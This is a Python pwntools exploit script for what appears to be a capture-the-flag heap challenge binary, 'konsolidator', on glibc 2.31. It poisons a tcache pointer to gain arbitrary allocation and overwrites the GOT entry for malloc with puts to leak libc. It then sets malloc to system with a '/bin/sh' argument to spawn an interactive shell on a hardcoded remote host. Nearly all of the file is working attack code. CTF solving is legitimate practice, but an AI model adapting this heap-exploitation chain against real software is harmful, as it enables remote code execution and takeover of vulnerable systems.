#!/usr/bin/env python3

from pwn import *

exe = ELF("./konsolidator")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ["pwntools-terminal"]

DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc 34.70.212.151 8001"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")		# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
c
"""

MENU_STR = b">> "
SIZE_STR = b"Size\n>> "
INDEX_STR = b"Index\n>> "
DATA_STR = b"Data\n>> "
recv_list = []

def recv_all(io: tube, timeout: float=None):
	global recv_list

	for x in recv_list:
		if timeout is None:
			io.ru(x)
		else:
			io.rut(x, timeout=timeout)
	recv_list = []

def conn():
	if args.LOCAL:
		return process([exe.path])
	
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)

	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	
	return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def malloc(io: tube, idx: int, size: int):
	io.sl(b'1')
	io.sl(bstr(idx))
	io.sl(bstr(size))

	global recv_list
	recv_list += [SIZE_STR, MENU_STR]

def change_size(io: tube, idx: int, size: int):
	io.sl(b'2')
	io.sl(bstr(idx))
	io.sl(bstr(size))

	global recv_list
	recv_list += [SIZE_STR, MENU_STR]

def free(io: tube, idx: int):
	io.sl(b'3')
	io.sl(bstr(idx))

	global recv_list
	recv_list += [INDEX_STR, MENU_STR]

def edit(io: tube, idx: int, data: bytes):
	io.sl(b'4')
	io.sl(bstr(idx))
	io.sl(data)

	global recv_list
	recv_list += [DATA_STR, MENU_STR]

def exit(io: tube):
	io.sl(b'5')

def main():
	while True:
		io = conn()
		global recv_list
		recv_list = [MENU_STR]

		malloc(io, 0, 0xf8)
		malloc(io, 1, 0xf8)
		free(io, 0)
		free(io, 1)

		# this has broken a tcache fd ptr and set its 2 lsb's to 0x000a
		# if the heap is at 0x..0000 (1/16 since it is 0x...000), this will alloc at the start of the heap (offset 0xa)
		# this is on top of the tcache so we'll be able to overwrite it and have arbitrary allocs
		edit(io, 1, b'')

		malloc(io, 0, 0xf8)
		malloc(io, 0, 0xf8) # this usually crashes! 1/16 i think
		try:
			recv_all(io)
		except EOFError:
			io.close()
			continue

		# offsets:
		# at 6 there's the first tcache counter (tcache[0x20])
		# at 134 there's the first tcache pointer (tcache[0x20])
		# pointers = dict[size, ptr]
		set_pointers = lambda pointers: edit(io, 0, flat({
			6:		flat({ ((size-0x20)//0x10)*2: 0xffff for size in pointers.keys() }, word_size=16, filler=b'\0'),
			134:	flat({ ((size-0x20)//0x10)*8: ptr for size, ptr in pointers.items() }, filler=b'\0')
		}, filler=b'\0'))

		# overwrite got[malloc] with plt[puts]; it malloc's our size and we can give it a size_t, so any address
		# we now have arb read
		set_pointers({ 0xa0: exe.got.malloc })
		malloc(io, 1, 0x98)
		edit(io, 1, p64(0x401040))

		# read got[free] to leak libc
		malloc(io, 2, exe.got.free)
		recv_list.pop()
		recv_all(io)
		libc.address = u64(io.r(6).ljust(8, b'\0')) - libc.sym.free
		aleak("libc", libc.address)
		recv_list.append(MENU_STR)

		# now turn malloc into system and use &binsh as size
		edit(io, 1, p64(libc.sym.system))
		malloc(io, 2, libc.binsh())

		io.interactive()
		break

if __name__ == "__main__":
	main()
